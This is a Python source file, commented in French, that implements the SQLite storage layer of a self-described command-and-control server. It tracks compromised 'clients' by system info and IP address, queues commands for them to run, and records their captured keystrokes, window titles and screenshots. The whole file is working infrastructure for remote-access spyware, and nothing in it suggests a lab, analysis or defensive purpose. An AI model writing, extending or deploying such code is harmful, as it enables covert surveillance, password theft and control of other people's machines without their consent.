import sqlite3
import json
import time
from datetime import datetime
from typing import Optional, Dict, List, Any
import threading

class Database:
    """Gestionnaire de base de données pour le serveur C2"""
    
    def __init__(self, db_path: str = "c2_server.db"):
        self.db_path = db_path
        self.local = threading.local()
        self.init_database()
    
    def get_connection(self):
        """Obtenir une connexion thread-safe à la BD"""
        if not hasattr(self.local, 'conn'):
            self.local.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.local.conn.row_factory = sqlite3.Row
        return self.local.conn
    
    def init_database(self):
        """Initialiser les tables de la base de données"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        # Table des clients
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                client_id TEXT PRIMARY KEY,
                system_info TEXT,
                first_seen REAL,
                last_seen REAL,
                ip_address TEXT,
                checkin_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Table unifiée des commandes (remplace pending_commands et command_results)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command_id TEXT UNIQUE,
                client_id TEXT,
                action TEXT,
                data TEXT,
                result TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                sent_at REAL,
                completed_at REAL,
                FOREIGN KEY (client_id) REFERENCES clients(client_id)
            )
        ''')
        
        # Table des keylogs
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                timestamp TEXT,
                window_title TEXT,
                key_data TEXT,
                event_type TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (client_id) REFERENCES clients(client_id)
            )
        ''')
        
        # Table des screenshots
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                screenshot_data TEXT,
                metadata TEXT,
                timestamp REAL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (client_id) REFERENCES clients(client_id)
            )
        ''')
        
        # Table d'historique des activités
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                activity_type TEXT,
                description TEXT,
                timestamp REAL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (client_id) REFERENCES clients(client_id)
            )
        ''')
        
        # Index pour améliorer les performances
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id, status)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_command_id ON commands(command_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_keylogs_client ON keylogs(client_id, created_at)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_activity_log_client ON activity_log(client_id, timestamp)')
        
        conn.commit()
        print("[DB] Base de données initialisée avec succès")
    
    # ==================== GESTION DES CLIENTS ====================
    
    def register_client(self, client_id: str, system_info: Dict, ip_address: str) -> bool:
        """Enregistrer ou mettre à jour un client"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            current_time = time.time()
            
            # Vérifier si le client existe déjà
            cursor.execute('SELECT checkin_count, first_seen FROM clients WHERE client_id = ?', (client_id,))
            existing = cursor.fetchone()
            
            if existing:
                # Mettre à jour client existant
                cursor.execute('''
                    UPDATE clients 
                    SET system_info = ?, last_seen = ?, ip_address = ?, 
                        checkin_count = ?, updated_at = CURRENT_TIMESTAMP
                    WHERE client_id = ?
                ''', (
                    json.dumps(system_info),
                    current_time,
                    ip_address,
                    existing['checkin_count'] + 1,
                    client_id
                ))
            else:
                # Nouveau client
                cursor.execute('''
                    INSERT INTO clients (client_id, system_info, first_seen, last_seen, ip_address, checkin_count)
                    VALUES (?, ?, ?, ?, ?, 1)
                ''', (
                    client_id,
                    json.dumps(system_info),
                    current_time,
                    current_time,
                    ip_address
                ))
                
                # Log l'activité
                self.log_activity(client_id, 'registration', 'New client registered')
            
            conn.commit()
            return True
        except Exception as e:
            print(f"[DB] Erreur lors de l'enregistrement du client: {e}")
            return False
    
    def update_client_heartbeat(self, client_id: str) -> bool:
        """Mettre à jour le heartbeat d'un client"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            current_time = time.time()
            
            cursor.execute('''
                UPDATE clients 
                SET last_seen = ?, checkin_count = checkin_count + 1, updated_at = CURRENT_TIMESTAMP
                WHERE client_id = ?
            ''', (current_time, client_id))
            
            conn.commit()
            return cursor.rowcount > 0
        except Exception as e:
            print(f"[DB] Erreur lors de la mise à jour du heartbeat: {e}")
            return False
    
    def get_client(self, client_id: str) -> Optional[Dict]:
        """Récupérer les informations d'un client"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('SELECT * FROM clients WHERE client_id = ?', (client_id,))
            row = cursor.fetchone()
            
            if row:
                return {
                    'client_id': row['client_id'],
                    'system_info': json.loads(row['system_info']),
                    'first_seen': row['first_seen'],
                    'last_seen': row['last_seen'],
                    'ip': row['ip_address'],
                    'checkin_count': row['checkin_count']
                }
            return None
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération du client: {e}")
            return None
    
    def get_all_clients(self) -> List[Dict]:
        """Récupérer tous les clients"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('SELECT * FROM clients ORDER BY last_seen DESC')
            rows = cursor.fetchall()
            
            current_time = time.time()
            clients = []
            
            for row in rows:
                clients.append({
                    'client_id': row['client_id'],
                    'system_info': json.loads(row['system_info']),
                    'first_seen': row['first_seen'],
                    'last_seen': row['last_seen'],
                    'ip': row['ip_address'],
                    'checkin_count': row['checkin_count'],
                    'online': current_time - row['last_seen'] < 10,
                    'uptime_seconds': current_time - row['first_seen']
                })
            
            return clients
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des clients: {e}")
            return []
    
    def cleanup_old_clients(self, max_age_seconds: int = 3600):
        """Supprimer les clients inactifs"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            current_time = time.time()
            cutoff_time = current_time - max_age_seconds
            
            cursor.execute('SELECT client_id FROM clients WHERE last_seen < ?', (cutoff_time,))
            old_clients = cursor.fetchall()
            
            for client in old_clients:
                client_id = client['client_id']
                self.log_activity(client_id, 'cleanup', 'Client removed due to inactivity')
            
            cursor.execute('DELETE FROM clients WHERE last_seen < ?', (cutoff_time,))
            conn.commit()
            
            deleted_count = cursor.rowcount
            if deleted_count > 0:
                print(f"[DB] Supprimé {deleted_count} clients inactifs")
            return deleted_count
        except Exception as e:
            print(f"[DB] Erreur lors du nettoyage des clients: {e}")
            return 0
    
    # ==================== GESTION DES COMMANDES ====================
    
    def add_command(self, client_id: str, command_id: str, action: str, data: Dict) -> bool:
        """Ajouter une nouvelle commande"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO commands (command_id, client_id, action, data, status, created_at)
                VALUES (?, ?, ?, ?, 'pending', ?)
            ''', (
                command_id,
                client_id,
                action,
                json.dumps(data),
                time.time()
            ))
            
            conn.commit()
            self.log_activity(client_id, 'command_queued', f'Action: {action}')
            return True
        except Exception as e:
            print(f"[DB] Erreur lors de l'ajout de la commande: {e}")
            return False
    
    def get_pending_commands(self, client_id: str) -> List[Dict]:
        """Récupérer les commandes en attente pour un client et les marquer comme envoyées"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT command_id, action, data, created_at 
                FROM commands 
                WHERE client_id = ? AND status = 'pending'
                ORDER BY created_at ASC
            ''', (client_id,))
            
            rows = cursor.fetchall()
            commands = []
            
            for row in rows:
                commands.append({
                    'command_id': row['command_id'],
                    'action': row['action'],
                    'data': json.loads(row['data']),
                    'timestamp': row['created_at']
                })
            
            # Marquer comme envoyées
            if commands:
                current_time = time.time()
                command_ids = [cmd['command_id'] for cmd in commands]
                placeholders = ','.join('?' * len(command_ids))
                cursor.execute(f'''
                    UPDATE commands 
                    SET status = 'sent', sent_at = ? 
                    WHERE command_id IN ({placeholders})
                ''', [current_time] + command_ids)
                conn.commit()
            
            return commands
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des commandes: {e}")
            return []
    
    def add_command_result(self, command_id: str, client_id: str, result: Any) -> bool:
        """Mettre à jour une commande avec son résultat"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            current_time = time.time()
            
            cursor.execute('''
                UPDATE commands 
                SET result = ?, status = 'completed', completed_at = ?
                WHERE command_id = ?
            ''', (
                json.dumps(result),
                current_time,
                command_id
            ))
            
            conn.commit()
            self.log_activity(client_id, 'command_completed', f'Command {command_id} completed')
            return cursor.rowcount > 0
        except Exception as e:
            print(f"[DB] Erreur lors de l'ajout du résultat: {e}")
            return False
    
    def get_command_result(self, command_id: str) -> Optional[Dict]:
        """Récupérer le résultat d'une commande"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT result, client_id, completed_at, status
                FROM commands 
                WHERE command_id = ?
            ''', (command_id,))
            
            row = cursor.fetchone()
            if row and row['result']:
                return {
                    'result': json.loads(row['result']),
                    'client_id': row['client_id'],
                    'timestamp': row['completed_at'],
                    'status': row['status']
                }
            return None
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération du résultat: {e}")
            return None
    
    def cleanup_old_commands(self, max_age_seconds: int = 3600):
        """Nettoyer les anciennes commandes complétées"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            cutoff_time = time.time() - max_age_seconds
            
            cursor.execute('''
                DELETE FROM commands 
                WHERE status = 'completed' AND completed_at < ?
            ''', (cutoff_time,))
            conn.commit()
            
            if cursor.rowcount > 0:
                print(f"[DB] Supprimé {cursor.rowcount} anciennes commandes")
        except Exception as e:
            print(f"[DB] Erreur lors du nettoyage des commandes: {e}")
    
    def get_command_stats(self, client_id: str = None) -> Dict:
        """Obtenir les statistiques des commandes"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            if client_id:
                cursor.execute('''
                    SELECT status, COUNT(*) as count 
                    FROM commands 
                    WHERE client_id = ?
                    GROUP BY status
                ''', (client_id,))
            else:
                cursor.execute('''
                    SELECT status, COUNT(*) as count 
                    FROM commands 
                    GROUP BY status
                ''')
            
            rows = cursor.fetchall()
            stats = {row['status']: row['count'] for row in rows}
            
            return {
                'pending': stats.get('pending', 0),
                'sent': stats.get('sent', 0),
                'completed': stats.get('completed', 0),
                'total': sum(stats.values())
            }
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des stats: {e}")
            return {'pending': 0, 'sent': 0, 'completed': 0, 'total': 0}
    
    # ==================== GESTION DES KEYLOGS ====================
    
    def add_keylogs(self, client_id: str, logs: List[Dict]) -> bool:
        """Ajouter des keylogs"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            for log in logs:
                cursor.execute('''
                    INSERT INTO keylogs (client_id, timestamp, window_title, key_data, event_type)
                    VALUES (?, ?, ?, ?, ?)
                ''', (
                    client_id,
                    log.get('timestamp'),
                    log.get('window', ''),
                    log.get('key', ''),
                    log.get('event', 'keypress')
                ))
            
            conn.commit()
            self.log_activity(client_id, 'keylogs', f'Received {len(logs)} keylogs')
            return True
        except Exception as e:
            print(f"[DB] Erreur lors de l'ajout des keylogs: {e}")
            return False
    
    def get_keylogs(self, client_id: str, limit: int = 100) -> List[Dict]:
        """Récupérer les keylogs d'un client"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT timestamp, window_title, key_data, event_type 
                FROM keylogs 
                WHERE client_id = ? 
                ORDER BY id DESC 
                LIMIT ?
            ''', (client_id, limit))
            
            rows = cursor.fetchall()
            keylogs = []
            
            for row in rows:
                keylogs.append({
                    'timestamp': row['timestamp'],
                    'window': row['window_title'],
                    'key': row['key_data'],
                    'event': row['event_type']
                })
            
            return keylogs
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des keylogs: {e}")
            return []
    
    def get_keylog_stats(self) -> Dict:
        """Récupérer les statistiques des keylogs"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT 
                    client_id,
                    COUNT(*) as log_count,
                    MAX(timestamp) as last_log_time
                FROM keylogs
                GROUP BY client_id
            ''')
            
            rows = cursor.fetchall()
            stats = {}
            current_time = time.time()
            
            for row in rows:
                client_id = row['client_id']
                client = self.get_client(client_id)
                
                stats[client_id] = {
                    'log_count': row['log_count'],
                    'last_log_time': row['last_log_time'],
                    'client_online': client and (current_time - client['last_seen'] < 60) if client else False
                }
            
            total_logs = sum(s['log_count'] for s in stats.values())
            
            return {
                'total_clients_with_logs': len(stats),
                'total_logs_stored': total_logs,
                'clients': stats
            }
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des stats: {e}")
            return {'total_clients_with_logs': 0, 'total_logs_stored': 0, 'clients': {}}
    
    def cleanup_old_keylogs(self, max_age_seconds: int = 24 * 3600):
        """Nettoyer les anciens keylogs"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            cutoff_time = time.time() - max_age_seconds
            
            # Pour SQLite, on doit comparer avec un timestamp converti
            cursor.execute('''
                DELETE FROM keylogs 
                WHERE datetime(timestamp) < datetime(?, 'unixepoch')
            ''', (cutoff_time,))
            
            conn.commit()
            
            if cursor.rowcount > 0:
                print(f"[DB] Supprimé {cursor.rowcount} anciens keylogs")
        except Exception as e:
            print(f"[DB] Erreur lors du nettoyage des keylogs: {e}")
    
    # ==================== GESTION DES SCREENSHOTS ====================
    
    def add_screenshot(self, client_id: str, screenshot_data: str, metadata: Dict) -> bool:
        """Ajouter un screenshot"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO screenshots (client_id, screenshot_data, metadata, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (
                client_id,
                screenshot_data,
                json.dumps(metadata),
                time.time()
            ))
            
            conn.commit()
            self.log_activity(client_id, 'screenshot', 'Screenshot received')
            return True
        except Exception as e:
            print(f"[DB] Erreur lors de l'ajout du screenshot: {e}")
            return False
    
    def get_screenshots(self, client_id: str, limit: int = 10) -> List[Dict]:
        """Récupérer les screenshots d'un client"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT screenshot_data, metadata, timestamp 
                FROM screenshots 
                WHERE client_id = ? 
                ORDER BY id DESC 
                LIMIT ?
            ''', (client_id, limit))
            
            rows = cursor.fetchall()
            screenshots = []
            
            for row in rows:
                screenshots.append({
                    'data': row['screenshot_data'],
                    'metadata': json.loads(row['metadata']),
                    'timestamp': row['timestamp']
                })
            
            return screenshots
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des screenshots: {e}")
            return []
    
    # ==================== GESTION DES ACTIVITÉS ====================
    
    def log_activity(self, client_id: str, activity_type: str, description: str):
        """Logger une activité"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO activity_log (client_id, activity_type, description, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (client_id, activity_type, description, time.time()))
            
            conn.commit()
        except Exception as e:
            print(f"[DB] Erreur lors du log d'activité: {e}")
    
    def get_activity_log(self, client_id: str = None, limit: int = 100) -> List[Dict]:
        """Récupérer l'historique des activités"""
        try:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            if client_id:
                cursor.execute('''
                    SELECT * FROM activity_log 
                    WHERE client_id = ? 
                    ORDER BY timestamp DESC 
                    LIMIT ?
                ''', (client_id, limit))
            else:
                cursor.execute('''
                    SELECT * FROM activity_log 
                    ORDER BY timestamp DESC 
                    LIMIT ?
                ''', (limit,))
            
            rows = cursor.fetchall()
            activities = []
            
            for row in rows:
                activities.append({
                    'client_id': row['client_id'],
                    'activity_type': row['activity_type'],
                    'description': row['description'],
                    'timestamp': row['timestamp']
                })
            
            return activities
        except Exception as e:
            print(f"[DB] Erreur lors de la récupération des activités: {e}")
            return []
    
    def close(self):
        """Fermer la connexion à la BD"""
        if hasattr(self.local, 'conn'):
            self.local.conn.close()
